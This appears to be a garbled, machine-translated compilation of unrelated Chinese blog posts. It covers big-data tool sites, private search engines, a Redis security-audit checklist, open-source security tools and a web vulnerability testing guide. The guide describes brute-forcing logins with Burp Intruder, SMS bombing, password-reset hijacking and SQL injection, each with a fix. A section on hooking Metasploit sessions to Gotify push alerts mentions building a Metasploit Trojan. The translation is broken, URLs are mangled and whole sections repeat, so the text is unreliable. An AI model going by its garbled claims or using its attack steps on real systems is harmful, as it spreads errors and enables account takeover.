The more warehouses JD builds, the closer the goods are to consumers, so that the shorter the distance between the goods moving, so the faster the speed is. This is the secret that JD's own logistics can reach the next day, or even the same day.

After understanding the actual application of big data in life, you may want to know if you can use big data. Today, Fuyun will introduce a big data tool navigation website, called "Big Data navigation", its interface is shown in the following figure: link: http://hao.199it.The com / "big data navigation" contains big data data sources, big data search tools, big data monitoring tools, big data analysis tools, big data visualization tools and other tools, to meet the needs of various big data tools. For several representative tools, Fu Yunjun gives you a simple introduction.

China National Data China National Data is an important national economic data released timely and authoritative by the China National Bureau of Statistics. It provides monthly visual data query of domestic and international, industry departments, provinces and annual months. It is the most authoritative and reliable data source for various national data.

Google Dataset Search pictures have picture search engine, video search engine for video, so is big data.

Almost all the data you want search for keywords in this site and find the relevant data.

The data contains who provides this data set, the timing of data release, the way of data collection, the terms of the use of data, etc., is a data search engine specifically for people in the field of data analysis, data science.

Real-time social media Real-time data Real-time social media can monitor the data generated by a certain social media within a specified time period, such as the number of tweets sent by Twitter in the past hour, the number of newly registered users, searches, etc.

Ali index Ali index is a data analysis platform to understand the market trend of e-commerce platform. Ali index according to the basic data of daily operation including daily website views, daily browsing, the number of new supply and demand products every day, the number of new companies and the number of products.

Ali Index provides exponential data analysis from regional and industry perspectives, as a reference for market and industry research, and an insight tool for social hot spots.

The Chart Show supports the rapid production of a variety of traditional charts and advanced visual charts, supports personalized and customized data analysis reports, supports dynamic playback and social sharing, provides professional industry data analysis report templates, provides fine typesetting styles, and provides multi-dimensional data analysis charts.

The above is just a simple example of various representative big data tools in the "big data navigation", which are also more commonly used. Those in need can experience it.

As a one-stop big data tool navigation website, "big data navigation" contains far more than this, you can explore by yourself.

DuckDuckGo is probably the best known alternative search engine that can search anonymously for questions and websites online.

The site does not aggregate complete information that indicates user search habits and behaviors, and does not collect personal information.

All popular browsers offer DuckDuckGo as a search engine option.

DuckDuckGo has recently added new extensions to its product line.

Not only does it keep your search secret, but it can also score the privacy of the site you visit.

Unlike DuckDuckGo, instead of searching for the Internet to generate unique results, Startpage allows users to obtain Google search results while protecting their data.

Startpage was initially a sister company to Ixquick and was founded in 1998.

In 2016, the two sites merged, and the Startpage owners made a huge investment from Privacy One Group last year.

The search engine also generates revenue from ads, but the ads are generated anonymously based on the search terms you enter.

Your information is not stored online and is not shared with other companies like Google.

Search Encrypt uses local encryption to protect your search.

It combines AES-256 encryption and security socket layer encryption.

Search encryption then retrieves your search results from its search partner network.

After completing the search, you can access your computer even if others, your search words expire and so they are private.

Search Encrypt has recently added more new features, including privacy-friendly videos, news, and map search.

With video search you can view the video directly on the search engine and provide additional privacy protection without pre-making advertising.

Brave browsers, one of the fastest, is entirely focused on privacy with features like private browsing, data protection, ad-free experience, bookmarking synchronization, tracking protection, and ubiquitous HTTP.

Brave has far less memory usage than Google Chrome,. The browser also supports both mobile and desktop terminals.

The Tor browser is another browser that you want to protect your data (including I P addresses) when you browse through the Web.

When browsing the W e b using Tor, your connection to the site will be anonymous because your request will be routed through other computers and your real IP address will not be shared.

In addition, the Tor suite comes with pre-installed NoScript and HTTPS Everywhere extensions, clear HTTP cookie, to further protect your privacy.

Gibiru obtained the search results from the improved Google algorithm.

Gibiru CEO Steve Marshall announced in a press release that his service was exactly Google's earlier service.

It provides reliable search results without all the tracks Google does today.

Gibiru positioned itself as " faster than the NSA search engine because it doesn't install a variety of personalized and tracking cookie. s on your system"Gibiru is outspoken against Google's ability to manipulate or review your search results.

Swisscows is manufactured by Hulbee AG, a Swiss-based technology company.

Like other private search engines in this list, this list does not build track profiles for its users or use unique identifiers.

The main difference from others is that this is a semantic search engine.

This means that it uses AI and machine learning to evaluate the context of user search.

Swisscows, Swisscows provides results that can learn to answer questions and is a cool search tool.

Yippy also has an additional feature to automatically classify the query results.

For example, searching for "dogs" shows the best results but also training, photos, dog breeds, rescue, etc.

It doesn't track web search users with ads.

Unlike any other search engine, Ecosia is a carbon-neutral search engine, a green search engine based on Bing and Yahoo, with Ecosia search results provided by Bing and enhanced by the company's own algorithm.

Ecosia appeared on December 7,2009, and the company donated most of its profits to tree-planting businesses worldwide.

Ecosia says it is a privacy-focused search engine, and your search is encrypted, which means the data is not permanently stored and sold to third-party advertisers.

Qwant is a private search engine located in Europe, " never trying to guess who you are or what you're doing."Based on its about page, Qwant never records your search nor uses your personal data for advertising or other purposes.

Discrete Search is a meta-search engine that does not track any identifiable information.

It is a good choice for those who seek quick results in a clean and user-friendly form.

It uses end-to-end encryption to keep your search as confidential as possible.

Oscobo is a search engine created specifically to protect users' privacy.

It doesn t track your information such as Google.

Oscobo says that you use your personal data to pay for the search, but you shouldn't do that.

Oscobo fully encrypts your search words, so no one can intercept or decrypt your search words.

It doesn t use third party scripts or analysis on its search engine so only you know the content of the search.

searx.The me is also a privately established open-source search engine that can also be found on github.

You can directly find what you want that you can't find in China.

MEZW Search is an aggregation search engine website dedicated to providing users with accurate and clean web content search services. Our search results come from the aggregation of different content channels at home and abroad, and we can block any undesired website after landing on your account.

In the Internet era, personal privacy security is closely related to everyone. It is urgent to learn how to achieve "personal privacy security protection" by improving privacy security awareness and standardizing Internet behavior. Personal privacy protection has become a required course for every citizen.

If there is something wrong, please correct it.

Early research for the early stage of the insurance system situation, here we want to understand the version of the database.

View the database version: the operation and maintenance personnel will generally configure the environment variables of the redis command, if the following command is not good to use find to find it, some basic knowledge is not said here.

Login users should be identified and identified with unique identity, identification information with complexity requirements and replaced regularly.

Identity and Identification By default, the redis database logs in directly without a password: enter the redis-cli directly to login, so we want to view the redis profile, usually redis.In conf, in the redis home, see if the requirepass parameter is not an annotation state: if not an annotation state.

If you have set a password, note: there is no user concept here, only one password verification.

Identity identification information has complexity and regular change can not meet this requirement, no password complexity, maximum use duration setting function.

Check here that the user's current password complexity meets the requirements.

Operation timeout auto exit function to view the redis profile, generally redis.The conf, viewing the value of timeout in the redis home, the default is 0 never exit here is requiring reauthentication after 120 seconds exit.

Beyond this time it requires a re-identification.

When remote management is conducted, necessary measures should be taken to prevent the identification information from being eavesdropping in the network transmission by default: grabbing the package is a clear transmission to ask whether the manager has done relevant measures to prevent the identification information from being eavesdropping in the transmission process.

Users should be identified with password, password technology, biotechnology and other two or more combinations of identification technologies to identify users, and one of the identification technologies should at least use password technology to achieve this generally will not do, we as long as check on the site whether it uses two-factor authentication.

Because Redis database has no user this concept, through a single password verification can login, have all permission, so for access control of the control point, some is not applicable, some are not consistent, this I think can judge according to the organization's own requirements, after all, there is not a unified standard.

The account and permission should be assigned to the login user have no user concept, through password verification, have all permissions.

The default account should be renamed or deleted with no default password for modifying the default account.

Excess or expired accounts should be deleted or stopped in time to avoid the existence of the no-account concept of shared accounts.

The minimum permissions required by the management user should be granted, and the permission separation of the management users cannot be divided and cannot be done.

The access control policy shall be configured by the authorized subject, which specifies that the subject has no authorized subject to the access rules of the object.

The granularity of access control should reach the main user level or process level, the object is file, database table level no user concept.

Security markers should be set for important subjects and objects, and control subjects fail to have access to information resources with security markers.

Security audit should be enabled covering each user, auditing important user behavior and important security events to view the redis profile, generally redis.The conf, view the loglevel, logfile parameter in the redis home, the version I installed by default: r e d i s supports loglevels through loglevel CI, in four levels, namely debug, verbose, notice, warning.

The redis also supports setting the logfile generation location via the logfile configuration items.

If set to an empty string, the redis output the logs to the standard output, and the log is sent to / dev/null.

Here we configure and output the log to the following file.

After the restart, the log is written to this file, so here we have to determine two parameters: loglevel, logfile.

And the logfile must be configured, because the corresponding log is not retained.

Audit records shall include the date and time of the event, user, event type, event success, and other audit-related information are compliant by default, and the log time follows the system time.

For example, if I just restart the database, I will produce the corresponding log.

Audit records shall be protected, backed up regularly from unanticipated deletion, modification, or override that shall not exceed 644 and should be permanently saved by default.

Regularly backup questions and ask the manager if you can do them.

The audit process should be protected against unauthorized interruption from default compliance.

Cannot interrupt the output of the log file, but you can modify the log level.

Here just look at the i p address followed by the bind.

Should be able to find possible known vulnerabilities, and after full testing and evaluation, timely repair vulnerabilities combined with leakage, testing and other methods to judge, redis this thing is known for many loopholes.

For example, the unauthorized access vulnerability, the local test can be successfully, here is not detailed, give it to the penetration engineer to see, and then we wait for the insurance to take their report to confirm whether there is a corresponding vulnerability.

For this database, the following two defaults are inconsistent.

Ask managers if they have taken measures to ensure the integrity of the data.

Verification technology or password technology shall be used to ensure the integrity of important data during transmission, including but not limited to identification data, important business data, important audit data, important configuration data, important video data and important personal information.

Verification technology or cryptographic technology shall be used to ensure the integrity of important data in the storage process, including but not limited to identification data, important business data, important audit data, important configuration data, important video data and important personal information.

Ask managers if they have been taken to keep the data confidential.

Cryptography shall be used to ensure the confidentiality of important data during transmission, including but not limited to identifying data, important business data and important personal information.

Password technology should be used to ensure the confidentiality of important data in the storage process, including but not limited to identification data, important business data and important personal information 7. Data backup and recovery.

Local data backup and recovery function should provide important data. Just ask the manager how to do the backup and whether there are measures to ensure the effective backup data (with test records).

Off-site live backup function should be provided to ask the administrator for important data backup to the backup site.
Thermal redundancy of important data processing systems should be provided to ensure the high availability of the system and the necessity for thermal redundancy.

But safety problems often require a lot of capital investment, such as hiring safety engineers, product research and development, testing and other processes.

This is absolutely unacceptable for those enterprises that are originally in short supply of funds.

Therefore, to reduce the capital investment in this area, many security personnel will choose to use some open source software instead.

In fact, whether it is learning, trials, or deployment on a production basis, security professionals have long seen open-source software as an important component of its toolkit.

Here we recommend 10 open-source security tools that you should understand / are worth using.

NessusNessus is arguably the most widely used system vulnerability scanning and analysis software in the world.

According to the sectools.According to o r g, Nessus is the most popular vulnerability scanner and currently the third popular security program.

The Nessus is available in both free and commercial editions.

The current version, Nessus 7.1.0, is a commercial version, although it is free for personal home use.

The current 2005 version is still open-source for free.

While Tenable retains version 2, it has been bifurcated developed in several different directions.

Nessus knowledge remains a valuable career skill.

Snort Just as thousands of IT security professionals first learn vulnerability scanning from Nessus, Snort has been the starting point for intrusion Detection Systems (IDS) knowledge.

There are three ways s n o r t works: sniffer, packet recorder and network intrusion detection system.

Therefore, it can be the core of automated security systems or a component of a range of commercial products.

Currently Snort is owned by Cisco, Snort will continue to develop and be developed by an active community.

As an important open-source software, Snort can be said to be one of the software that security practitioners must understand and learn from.

NagiosNagios is an open-source free network monitoring tool that effectively monitors the host status of Windows, Linux and Unix, network devices such as switch routers, printers, etc.

Like many other open-source software packages, Nagios offers both free and commercial versions.

Nagios Core is the core of open source projects, based on a free open source version.

You can monitor a single product or perform single tasks through plugins; there are about 50 "official" plugins developed by Nagios and over 3,000 community-contributed plugins.

The Nagios user interface can be modified via the desktop, the Web, or the mobile platform front end, and the configuration can be managed through one of the available configuration tools.

Ettercap If you need to test your corporate network against middleman attacks (MITM), then Ettercap will be your preferred tool.

The project has been doing one thing since its first launch in 2001- -launching MITM attacks.

Ettercap currently supports four basic attack modes: IP-based, MAC-based, and two ARP policy-based attacks.

During scanning to test attacks, Ettercap can provide a lot of information about the network and its devices.

As part of the overall security kit, Ettercap is best of MITM attacks.

Infection MonkeyInfection Monkey is a data center security detection tool released by the Israeli security company GuardiCore at the Black Hat Conference 2016, which is mainly used for the automated detection of data center boundaries and internal server security.

The user interface is one of the striking features of the Infection Monkey.

Although some open source security projects offer minimalist UI or G-I-dependent plugins or skins for GUI, Infection Monkey has the same GUI as many commercial software tools.

The source code for the Infection Monkey is available to you on the GitHub.

In Delta's security test against traditional networks, the security problem of the software-defined network (SDN) is a field in the stage of development- -which is one of the important reasons why Delta was developed.

As a project of the Open Networks Foundation (ONF), Delta looks for potential issues in the SDN and explores these issues to help determine their availability.

Delta has built-in fuzzing capabilities designed to detect known or unknown network vulnerabilities.

Delta's code and executable are available for viewing / download on GitHub.

There are many ways for Cuckoo Sandbox to judge whether a file is safe, but there are some risks. Cuckoo sandbox is a well-known open-source sandbox system for secure test files. A malicious program analysis system based on a virtualized environment can automatically execute and analyze program behavior.

The Sleuth Kit figuring out what is happening in the attack could be a key step in preventing future incursions.

Sleuth Kit is an open-source electronic forensics survey tool that can be used to recover lost files from disk images, as well as for disk image analysis for special events.

The Autopsy tool is a web interface for sleuth kit that supports all the features of sleuth kit.

This tool is available under both the Windows and Linux platforms.

Both currently have a large active user base and are actively developed and contributed.

LynisLynis is a Unix system security audit and reinforcement tool capable of deep security scanning, and the purpose is to detect potential time and advise on future system reinforcement.

The software scans for general system information, fragile software packages, and potential misconfigurations.The Lynis code is currently hosted in GitHub, with its main support coming from its creator, Cisofy.

One of the special features of Lynis is its ability to scan and evaluate popular I o T development boards (including Raspberry Pi) due to its Unix base.

Certbot encryption is important for many security standards and implementing encryption can be complex and costly, but EFF has tried to reduce these troubles with tools like Certbot, an open source automated client that can extract and deploy SSL/TLS certificates for your Web server.

At this time, the time to test whether your basic knowledge is solid.

User name enumeration vulnerability description: generally exists in the system login page, use the loopholes in the login system can test out which user names exist, return different error information can enumerate the user name existing in the system.

Test method: Find the website or w e b system login page.

In the web system login page, manually use the user name in the system, password at will, try to log in, view its display content.

For example, enter the user name admin, is as follows: password error; enter the user name test, return is as follows: the user does not exist.

Example: Risk analysis: An attacker can enumerate the login user name existing in the system according to the above prompt information returned by the Web application, and then violently crack the password for the enumerated login user name.

Repair scheme: It is recommended to modify the judgment display information of the website login page as consistent: wrong user name or password.

Weak password vulnerability description: some manufacturers have the default user name and password (user name is given priority to with root, admin) example: usually many manufacturers background default account for "admin", password "admin" or "123456", you can through violent crack to try risk analysis: attackers can use the Internet public common weak password try login management background, have a certain impact on the website.

Repair scheme: prohibit the use of a weak password, the password should meet a certain complexity (digital letter special symbol, password to keep more than 16 digits).

Recommend a random, password-generated website, https://suijimimashengcheng.bmcx.The com / empty password vulnerability description: Find the website login page, try to enter the user name, the password is empty.

If the login successfully indicates that the authentication login link allows an empty password risk analysis: the attacker can use the vulnerability to log in to the background of the website, operate sensitive data, and even upload the webshell, to control the server.

Repair scheme: determine whether the input password is empty, and prohibit the empty password login.

Logon authentication bypass vulnerability description: Some login pages can disable js style (uncommon), can easily bypass the login authentication, directly into the system.

Repair scheme: can be avoided from the following aspects: increase verification bypass the verification code, do not use front-end verification, password through encryption algorithm encryption, failure times, password intensity increase violence crack vulnerability description: is by social worker information random combination of password violence crack, general user name password without the things around, and website password field is clear test method: find the website login page.

Use burp to grab the login page, send it to Intruder, and set its password parameters, such as pwd= as a variable, add payload(dictionary), attack, view the returned byte length of the attack, to determine the success.

In general, there are three forms of violent crack: a fixed account number to the password violent crack.

On the premise of learning that the account is regular, or through a certain way to obtain a large number of accounts, the fixed password to the account violent crack.

Use the account password database spread on the Internet to hit the database attack.

Example: Risk analysis: attackers generally use automated scripts to combine common user names and passwords, namely the dictionary, combined with the intruder function of the software burpsuite for violent cracking.

Repair scheme: some methods to prevent violent attack are as follows: increase verification code, password through encryption algorithm, failure times, password intensity increase password verification code not invalid vulnerability description: some website login box graphics verification code, prevent violent crack attack, but the normal logic is the front input after verification code verification graphic verification code, then if true login operation, for false return verification code input error, and use a verification code should be immediately invalid.

However, some site captcha may be controllable, Enter some special characters may be able to cheat the server or verification code after using once and did not timely refresh the test method: after entering the user name, password, verification code, Click the landing button to simultaneously block the packet using the burpsuite, Data replay is also performed using the Repeater module or the Intruder module, Resend five watch page changes, Will you prompt the verification code input error and other information example: there is a graphic verification code when this login function, Data replay occurs after the correct graphical verification code is entered, Found that the figure verification code did not fail in time

The system pays attention to destroy the verification code in the session after verification and identification during development.

The verification code submitted by the user cannot be empty.

Description of bypassing the vulnerability: If some websites use the mobile phone SMS to log in, the SMS verification code can be bypassed or the verification code is too short and can be blasted.

Request to send a text message, fill in any verification code, and then submit other operation requests, empty or delete the verification code parameters, and test whether you can bypass the detection.

Try a privilege verification code like 000000,111111, etc.

Whether the same SMS verification code can be used many times.

The correct logic should be that after the SMS verification code is obtained, the server should verify the source and effectiveness of the SMS verification code, and should be invalid immediately after using it once.

But I met this is the use of verification code, verification code login, cancellation user login using verification code login found still login successfully, namely SMS verification code was not deleted risk analysis: modify / reset password, transaction functions such as SMS verification code, if verification code can bypass, the attacker can use the vulnerability to reset others password or transfer and other dangerous operations.

If a privilege verification code exists, it is recommended to delete it.

The application service side should strictly check whether the verification code parameters are empty and whether the format is correct.

For each request, a new message verification code should be sent, and the old verification code should not be used.

Here SMS verification code can be broken, because there is not set SMS verification code use error after several times, so can be violent crack risk analysis: modify / reset password, transaction functions such as usually need SMS verification code, if verification code can be violent crack, the attacker can use the vulnerability to reset others password or transfer and other dangerous operations.

The SMS verification code is not less than 6 digits.

Effective for no more than 1 minute.

An account locking policy should be adopted when the number of verification code errors exceeds the upper limit.

SMS attack vulnerability description: a common attack when SMS attack, the attacker through the website page provides the function of sending SMS verification code, through the send packet acquisition, replay, if the server SMS platform did not do verification, the system will continue to send SMS, thus caused the SMS bombing vulnerability.

manually find the website registration page, authentication page, whether there is a message sending page, if so, take the next step.
By using the burp or other package truncation tool, grab the packet that sends the verification code, and replay the attack, to check whether the phone has received more than 10 consecutive text messages in a short period of time. If you receive a large number of text messages, there is a vulnerability.

Use burpsuite to conduct data replay risk analysis: attackers fill in others's mobile phone number and submit the intruder function of software burpsuite, so as to achieve the purpose of sending a large number of spam messages to others' mobile phones in a short time.

Reasonable configuration of the background SMS server function, for the same mobile phone number, the sending times should not exceed 3-5 times, and the transmission time interval can be limited.

When the front desk code is written on the page, prohibit the transmission for the same mobile phone number is more than N times, or the verification code function is added to the page, and the sending time interval is limited.

The authentication function should not continue after the account is locked.

The authentication function prevents automation operations, such as adding a graphical verification code.

Password explicit transmission vulnerability description: The transmission is not encrypted during the authentication process.

By grabbing the request of the website login page, the tool is available to burp, wireshark, filder and so on.

Package-intercept risk analysis was performed using burpsuite.

The attacker obtains the authentication certificates for the explicit text transmission, such as sensitive information such as the user name password and SESSIONID, by sniffing the network traffic in the LAN network.

It is suggested that according to the secret level requirements of the website, encryption requires encryption, such as using HTTPS, but encryption to increase the cost, which may affect the user experience.

If you do not use HTTPS,, you can use Javascript as password encryption at the front end of the website, encryption before transmission.

Reflective cross-station script attack vulnerability description: The English full name of the cross-station script attack is Cross Site Script, to distinguish from the style sheet, abbreviated as XSS.

It happens because the site outputs the user input into the page, in which process malicious code may be executed by the browser.

Cross-station scripting attack which refers to a malicious attacker inserting malicious h t m l code into a Web page and when the user views the page the html code embedded in the Web is executed for the special purpose of the malicious user.

The test statements of specific cross-station scripts vary depending on the reality, can be self-constructed, as well as trigger events, and only some of the most common construction statements are listed here.

Use a standard input validation mechanism to verify the length, type, syntax of all input data, and business rules before any data is accepted as if it can be displayed or stored.

Before data output, ensuring that the user submitted data is entity encoded correctly, it is recommended that all characters are encoded and not limited to a subset.

Specispecify the output: Do not allow an attacker to choose for your user.

Note the limitations of the blacklist validation method: Just find or replace some characters is easily bypassed by XSS-variant attacks.

Warning of normalization errors: Before verifying the input, it must be decoded and normalized to meet the current internal representation of the application.

Make sure that the application does not decode the same input twice.

Use a parameterized query to avoid stitching the unfiltered input directly into the SQL query statement.

The permissions used in the Web application to connect to the database are strictly distinguished from the system administrator users of the database, and set the users used in the Web application to connect to the database are not allowed to operate other databases.

Users who set up in the Web application to connect to the database do not allow write permission to the Web directory.

Use the Web to apply a firewall.

Description of sql injection vulnerability: Attack test method to change the meaning of the original statement by combining sql statements: 1. Detection all links through the web vulnerability scanning tool, or manually determine whether there is an injection point. Once the vulnerability is confirmed, you can use the automation tool sqlmap to try injection.

Several common judgment methods: 1) Digital type.2) Hollerith type.

Repair scheme: The main reason for SQL injection is that the program does not strictly filter the user input data, resulting in illegal data intrusion into the system.

Special characters entered by the user are strictly filtered, such as ', ", <,>, /, *,;, +, -, &, |, (,), and and, or, select, union.

Use a parameterized query to avoid stitching the unfiltered input directly into the SQL query statement.

The permissions of the users in Web applications are strictly distinguished from the system administrator users of the database (such as unable to perform drop, etc.) and set that users in the Web application are not allowed to operate other databases.

Users who set up in the Web application to connect to the database do not allow write permission to the Web directory.

The password modification step is generally to check whether the user's original password is correct, and then let the user enter a new password.

Get the link to reset the password by normal means, and guess the composition structure and content of the link.

Construct a link to reset someone's password when you know someone's mailbox.

Reset other people's password by knowing their phone number by exhausthe phone verification code.

The password reset vulnerability I encountered is that I will automatically send a phone message to the phone when forgetting the password, and what I do is intercept it, then modify the phone number, successfully accept the phone message, and then reset the user password.

Another is that after the mobile phone SMS verification, intercept the packet when you reset the password, and modify other people's account password by changing ways such as username, userid.

Password modification function is often implemented step by step, and the attacker bypasses some test steps to modify the user password with an unknown original password.

The reset password process is generally to first verify the registered mailbox or mobile phone number, obtain the link or verification code of the reset password, and then access the reset password link or enter the verification code, and finally enter the new password.

Password reset mechanismSurventing an attack is to directly reset someone else's password by constructing a reset password link or exhaustive mobile phone verification code without an unknown reset password link or mobile phone verification code.

Timely verify the requested user identity and the current logged-in user identity, judge whether you have the right to modify the user's password, and also determine whether the original password is correct.

With the verification of the original password, the number of errors in entering the original password is limited to prevent the attacker from violently breaking the original password.

Key information in the reset password link should be randomized, unpredictable, and prohibit the return of key information to the client.

Directory browsing vulnerability is due to the configuration defects of the website and directory browsing vulnerability, which will lead to many privacy files and directories leaked, such as database backup files, configuration files, etc., attackers can use the information to more easily access the website permission, leading to the website to be hacked.

Use web vulnerability scanner can scan web application for detection or by search, website title containing "index of" keywords website for access.

The common middleware that exists this vulnerability is apache and IIS.

Turn off directory browsing in IIS: In the IIS website properties, check the Directory Browse option and restart the IIS.

Close the directory browsing function in Apache: Open the Apache profile httpd.For conf, find "Options Indexes FollowSymLinks", modified to "Options-Indexes", minus denote cancel, save exit, restart Apache.

Directory browsing is not turned on by default in Nginx, and if you find that it is currently on, you can edit nginx.The conf file, delete the following two lines: autoindex on;autoindex_exact_size on, restart Nginx.

Description of sensitive File Information Disclosure Vulnerability: Sensitive data includes but is not limited to: password, key, certificate, session identity, License, privacy data, authorization data, authorization credentials, personal data, etc., and may contain sensitive data in program files, configuration files, log files, backup files and databases.

Detection forms are varied, and the tool crawler scans the path to the sensitive files, thus finding the sensitive data.

Manual manually to find sensitive information based on the web container or web page source code.

Here I brought you the recent fire sharp information leak, in the source code leaked the user name password information leaked the user name and MD5 encryption password, of course, some strange work, will directly pop up test user name password, even user name password automatic filling and so on I think only these to become information leakage, the rest of a encryption way, middleware version information is too marginal, lazy risk analysis: attackers can obtain website sensitive files, collect website sensitive information, thus targeted use.

Vulnerability in the development framework, such as the Struts2 framework vulnerability, shiro, etc.

After understanding the structural framework adopted by the website, remove the pseudo-static page, grab the package or read the page source code mode, and find that the website system url is.do and.After the action end type, add the corresponding remote command execution code for judgment.

Information transmission lacks security guarantee SSO certification communication process most use sensitive information in the form of sensitive information, which is easily stolen, resulting in important information leakage.

In addition, most schemes do not sign the key information during the communication process, and are vulnerable to camouflage attack.

Security Defects of Web Services Since single sign-on is basically implemented based on Web services, there are also inevitable security defects of Web services, such as cross-station script attacks, overreach attacks, etc.

Because you only need to log in once, all authorized application systems have access, which may lead to some important information leakage.

It is recommended to defend from the following aspects: 1. It is recommended to use the HTTPS protocol without affecting the business, transmission 2. Strictly verify the user identity in the SSO authentication process 3. Filter the incoming user parameters, escape or mask the special symbols.

This article is written with reference to my friend Mr.Peng's article. Here I am particularly grateful to Mr.Peng, infiltration master for providing technical guidance and penetration experience, such as the same unfortunate honor as this article.

Accidentally found this simple solution, but no one seems to have written an introduction, and then write it for yourself.

Focus on sharing, you have better ideas to communicate together.
If you are interested, you can see the official Commit record, and here is a special thanks to this big guy.

My code this time also pull to the official, hope can merge in goose goose goose.

But these will use third-party services (although your cloud server is also a third-party service), but to minimize third-party services, I look around for other ways.

The Gotify is the "A self-hosted push notification service.""An autonomous push notification service.

An open-source, Web, easy, quick, and deployment-friendly messaging notification service, written in the Go language, which is presumably why Gotify, is called "Go + Notify".

The other two are easy to understand by the name. Simply put, server and website,server are the official binary compilation content, which can be downloaded directly from release or compiled directly by itself. website is compiled with the help of npm, and requires the nodejs support of its own environment.

Every item here is basically annotated, and I don't explain it, focusing on the options for SSL.

When SSL is enabled, you can set enabled directly to true, and if you want to disable the HTTP Plain function, redirect the second SSL option to true, and otherwise to false to share https and http.

Enter the USERS page, we can create a new user, and decide whether the user has administrator permission, click the "pen" button behind the corresponding account to directly modify the password of the corresponding account.

We then need to access the APPS and create a corresponding Application, used to send our push message.

The flowchart is above, created here after we can get a token, and then we use this token to implement the sending of information.

If you want to distinguish between different types of push then you can create multiple Application, utilizing different t o k e n for classification.

At the same time, for each token,, we can click the upload button to upload a different avatar, and it can quickly distinguish after the push.

If we need to delete the historical push, we can delete it as a user, or build a new DELETE_TOKEN, in the Clients with this token to delete the history push.

On Android, we can also adjust the reminder method of different levels. According to their different mobile phone systems, the setting may be slightly different, but we can basically set whether it is a silent reminder, different reminder sound, whether the vibration, etc.

We need to modify / opt/metasploit-framework/embedded/framework/plugins/session_notifier.The rb file to implement the push request for msf.

Here, because SSL certification cannot proceed properly during many previous attempts, so SSL certification is directly ignored.

At the same time, the SSL authentication function is added to the original basis, choosing whether to send it to the H T T P S address by setting the gotify_ssl parameters.

You may then consider trying to add the HTTPS certificate validation for the push.

Saving the modification is after our actual call phase.

So we can load this plugin directly.

I usually use this as a result reminder of the scheduled tasks on my server.

Online reminder is really a very practical function, the use of gotify is also an unexpected joy, originally just to automatically sign in what some other scripts, find a message push software, just see someone said msf can use nail webhook, so can not resist the restless heart, to turn the source code according to modify debugging, before and after the time is not short.

Then there is the SSL certificate generation of that piece, a good guy is really toss about, but the English document writing is also really good, in need of friends myself strongly suggest to read a look.

However, I never had the opportunity to study it. Later, and because I had other reminder needs, I went to find a more mature and simple solution.

Accidentally found this simple solution, but no one seems to have written an introduction, and then write it for yourself.

Gotify is an open source, Web, easy, fast, easy deployment messaging notification service written in the Go language, which is presumably why Gotify, is called "Go + Notify".

Our presentations here all take server's release, for example.

Go to the https://github.com/gotify/server/releases downloads the corresponding binary file and runs directly after decompression.

Every item here is basically annotated, and I don't explain it, focusing on the options for SSL.

When SSL is enabled, you can set enabled directly to true, and if you want to disable the HTTP Plain function, redirect the second SSL option to true, and otherwise to false to share https and http.

The SSL certificate can be generated by itself and when I test locally both methods are available: https://wangbin.io/blog/it/https-ca.htmlhttps://www.cnblogs.com/asker009/p/13354656.html?utm_source=tuicool The corresponding path of the generated certificate and key file is written directly in certfile and certkey.

There are many ways to put the program in the background, do not repeat here, you need to Baidu ha ha ~ first talk about Gotify interface format http://yourIP/message?The token= <apptoken> POST way sends json data to first run the service and then log in to the web page with default secret admin/admin.

Enter the USERS page, we can create a new user, and decide whether the user has administrator permission, click the "pen" button behind the corresponding account to directly modify the password of the corresponding account.

We then need to access the APPS and create a corresponding Application, used to send our push message.

If you want to distinguish between different types of push then you can create multiple Application, utilizing different t o k e n for classification.

At the same time, for each token,, we can click the upload button to upload a different avatar, and it can quickly distinguish after the push.

If we need to delete the historical push, we can delete it as a user, or build a new DELETE_TOKEN, in the Clients with this token to delete the history push.

At the same time, the SSL authentication function is added to the original basis, choosing whether to send it to the H T T P S address by setting the gotify_ssl parameters.

You may then consider trying to add the HTTPS certificate validation for the push.

Saving the modification is after our actual call phase.

MSF push call the last step we have said that we actually change is an official plugin.

So we can load this plugin directly.

Having not officially integrated this modified module, I called a copy complex called session_gotify.The rb first generates a msf Trojan in the local machine to test the connection then we configure it in the msf terminal to listen and try the normal connection then we load the reminder module.

Next we set the parameter, and then we can receive a reminder from gotify to us if we use HTTPS, then follow the following setting, we can successfully implement the Gotify-based MSF online message reminder.

Gotify can also be very convenient to use in other reminders, CS online reminder is also OK, the next article may write CS online ha ha ha ~ its range of use and scene is very wide, and multi-end synchronous work is also good, friends with ideas can really try it to do some other work.

I usually use this as a result reminder of the scheduled tasks on my server.

Then there is the SSL certificate generation of that piece, a good guy is really toss about, but the English document writing is also really good, in need of friends myself strongly suggest to read a look.

At this time, the time to test whether your basic knowledge is solid.

User name enumeration vulnerability description: generally exists in the system login page, use the loopholes in the login system can test out which user names exist, return different error information can enumerate the user name existing in the system.

Find the website or w e b system login page.

In the web system login page, manually use the user name in the system, password at will, try to log in, view its display content.

An attacker can enumerate the login user name existing in the system according to the above prompts returned by the Web application, and then violently crack the password for the enumerated login user name.

It is suggested that the judgment return information of the website login page be modified as consistent: wrong user name or password.

Weak password vulnerability description: Some manufacturers have a default user name and password.

Usually, the default background account of many manufacturers is "admin", password is "admin" or "123456". You can try risk analysis through violent cracking: attackers can use the common weak password disclosed on the Internet to try to login to the management background, which has a certain impact on the website.

Repair scheme: Weak password should meet certain complexity.

Find the website login page, try to enter the username, the password is empty to login.

If the login successfully indicates that the authentication login link allows an empty password risk analysis: the attacker can use the vulnerability to log in to the background of the website, operate sensitive data, and even upload the webshell, to control the server.

Determine whether the input password is empty, and prohibit the empty password to login.

Logon authentication bypass vulnerability description: Some login pages can disable js style (uncommon), can easily bypass the login authentication, directly into the system.

User name password can write click the login button at the same time to use the package tool to intercept the package back to the current page, modify the code value log on successful risk analysis: if the application is not done on the authentication, can lead to malicious users or attackers bypass authentication, access internal resources, this kind of vulnerability through the firewall and intrusion detection system is difficult to prevent.

Certification can be avoided from the following aspects: increase verification code, do not use front-end verification, password encryption through the encryption algorithm encryption, the number of failures more lock, password intensity increase there is violence to crack the vulnerability description.

With the password of the random combination of information obtained through social workers, the general user name password is inseparable from the things around you, and the website password field is a clear test method.

Use burp to grab the login page, send it to Intruder, and set its password parameters, add payload, to attack, view the length of the byte returned during the attack, to determine the success.

In general, there are three forms of violent crack: a fixed account number to the password violent crack.
On the premise of learning that the account is regular, or through a certain way to obtain a large number of accounts, the fixed password to the account violent crack.

Use the account password database spread on the Internet to hit the database attack.

Attackers generally use automated scripts to combine common usernames and passwords, namely the dictionary, combined with the intruder function of the software burpsuite for violent cracking.

